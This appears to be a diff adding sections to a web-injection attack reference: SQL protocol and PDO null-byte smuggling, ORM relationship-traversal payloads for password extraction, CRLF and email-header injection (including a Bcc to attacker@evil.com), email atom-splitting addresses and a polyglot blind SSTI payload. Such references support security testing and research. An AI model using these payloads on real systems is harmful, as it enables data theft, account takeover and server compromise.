@@ -47,6 +47,22 @@
 
 **Stored procedure output:** Parameterized input to stored procedures that internally use dynamic SQL (`EXEC`, `sp_executesql` with concat) — injection happens inside the procedure.
 
+### SQL Protocol-Level Smuggling
+
+Exploit differences between SQL wire protocol parsing and application-level query building. Injection occurs at the protocol layer rather than the SQL text layer:
+- MySQL COM_QUERY vs COM_STMT_EXECUTE handling differences
+- PostgreSQL extended query protocol: separate Parse/Bind/Execute messages can be manipulated
+- ODBC/JDBC driver-level escaping inconsistencies vs server-side parsing
+- **Impact:** Bypasses application-level parameterization when the driver constructs protocol messages unsafely
+
+### PDO Null Byte Smuggling (PHP)
+
+PHP PDO truncates strings at `\x00` in certain emulated prepare contexts. Input validation sees full string including null byte, but PDO truncates at `\x00` before sending to database — content after null byte stripped, content before it reaches the query.
+
+**Example:** `admin\x00' OR '1'='1` — validation sees the full string (no quote), PDO truncates to `admin`, but in certain edge cases the quote-after-null reaches the query.
+
+**Conditions:** PDO emulated prepares (`ATTR_EMULATE_PREPARES=true`), certain PHP/driver version combinations.
+
 ---
 
 ## NoSQL Injection
@@ -108,6 +124,27 @@ Framework-specific ORM behaviors that bypass authorization or validation logic:
 | **TypeORM** | `Like()`, `Raw()` with string interpolation in `find()` options | SQLi through ORM |
 
 **Key insight:** ORMs provide a false sense of security. Any ORM method that accepts complex objects from user input (nested filters, operators, raw expressions) can be smuggled past the ORM's query builder.
+
+### ORM Relationship Traversal Leak (plORMbing)
+
+When applications expose user-controlled filter parameters directly to ORM query builders, attackers traverse ORM relationships to reach sensitive fields on related models — using the ORM's own join syntax as a blind oracle for data exfiltration.
+
+**Affected ORMs:**
+
+| Framework | Filter Syntax | Example Payload |
+|-----------|--------------|-----------------|
+| **Django** | `__` double underscore | `?filter=user__password__startswith=a` |
+| **Prisma** | Nested `where` objects | `{"where":{"author":{"password":{"startsWith":"a"}}}}` |
+| **Beego** | Filter expression parser | `?filter=User.Password__startswith=a` (expression parser bypass) |
+| **Ransack (Rails)** | `_cont`, `_start`, `_eq` suffixes | `?q[password_start]=a` |
+| **OData** | `$filter` with navigation properties | `$filter=startswith(Author/Password,'a')` |
+| **Sequelize** | Nested include filters | `{"include":[{"model":"User","where":{"password":{"$like":"a%"}}}]}` |
+
+**Exploitation:** Iterate `startswith`/`contains` character-by-character to extract full field value — essentially blind injection via ORM relationship traversal.
+
+**Key insight:** Distinct from ORM smuggling (which bypasses ORM sanitization). plORMbing uses the ORM *as intended* — the vulnerability is exposing filter parameters to users without restricting traversable relationships.
+
+Source: Elttam, 2025. Nominated for PortSwigger Top 10 2025.
 
 ---
 
@@ -244,6 +281,7 @@ Inject `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `{7*7}`, `${{7*7}}` — resp
 - **Header injection:** inject `Set-Cookie`, `Location`, `X-Forwarded-For`, `Host` headers
 - **Log injection:** CRLF in log entries to forge log lines, inject false audit trails
 - **Email header injection:** `\r\nBcc: attacker@evil.com` in contact forms, password reset
+- **Nested response splitting CSP gadget:** first CRLF split injects a response body that itself contains a second CRLF split → script appears same-origin → bypasses CSP. `Content-Length`/`Transfer-Encoding` manipulation controls parser boundaries between injected responses.
 - **Sinks:** `header()` in PHP, `res.setHeader()`/`res.redirect()` in Node.js, `HttpServletResponse.setHeader()` in Java, `redirect_to` in Rails
 - **Common vectors:** redirect URLs, `Set-Cookie` values, `Location` header from user input, `Content-Disposition` filename
 - **Double-encoding bypass:** `%250d%250a` when server double-decodes
@@ -297,3 +335,57 @@ Namespace `xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"` then `
 
 ### .NET Native Code Execution
 `<msxsl:script>` with embedded C# calling `System.Diagnostics.Process.Start()` — complete system compromise
+
+---
+
+## Email Atom Splitting (Parser Differential Attacks)
+
+RFC-compliant email address features create systematic discrepancies between application validation and SMTP routing. Gareth Heyes (PortSwigger, 2024) demonstrated that email *addresses themselves* — not email content — can be weaponized.
+
+### Exploitable RFC Features
+
+| Feature | Example | Effect |
+|---------|---------|--------|
+| **Quoted local-part** | `"admin@attacker.com"@victim.com` | Some parsers extract domain from outer `@`, SMTP routes to inner |
+| **Encoded-word** | `=?utf-7?B?...?=@victim.com` | Base64/UTF-7/Q-encoding in local-part decoded differently by validator vs SMTP |
+| **Comments** | `admin(comment)@victim.com` | Some parsers strip comments, others include them in routing |
+| **Source routes** | `@relay:user@final.com` | Archaic SMTP routing — validator sees `final.com`, relay routes elsewhere |
+| **UUCP bang path** | `host!user@domain.com` | Legacy routing syntax parsed inconsistently |
+| **Percent hack** | `user%domain@relay.com` | Some MTAs expand `%` to `@`, routing to `user@domain` via relay |
+| **Punycode domain** | `admin@xn--evil-encoded.com` | Domain looks legitimate in Punycode but resolves to attacker |
+| **Unicode overflow** | Characters that overflow during normalization | Validator sees one domain, normalized form is another |
+
+### Impact
+
+- Bypass domain-restricted registration (sign up with `@victim.com` while receiving email at attacker server)
+- Bypass SSO organization controls
+- Bypass employee-only access barriers
+- Enable blind CSS injection via email display rendering
+
+### Confirmed Vulnerable Targets
+GitLab Enterprise, Zendesk, GitHub, Cloudflare, Joomla.
+
+Source: PortSwigger Research "Splitting the Email Atom", Black Hat 2024.
+
+---
+
+## Error-Based / Polyglot Blind SSTI Detection
+
+Adaptation of SQL injection error-based and time-based techniques to Server-Side Template Injection for blind targets where templates render server-side with no output reflection.
+
+### Technique
+
+1. **Polyglot detection payload:** single payload triggers distinct errors per engine — fingerprints engine without reflected output
+2. **Error oracle:** response status code, timing, response length, or error log differences serve as oracle
+3. **Iterative extraction:** once engine is identified, use error-based payloads to extract data character-by-character
+
+### Polyglot Payload Example
+```
+{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}{7*7}${{<%[%'"}}%\
+```
+Each engine fails differently — Jinja2 errors on `<%`, Twig on `${}`, FreeMarker on `#{}` — status code/timing differences fingerprint the engine.
+
+### Key Insight
+Existing SSTI methodology assumes reflected output. Error-based approach opens SSTI exploitation on fully blind targets — previously considered impractical.
+
+Source: PortSwigger Top 10 2025 nomination.
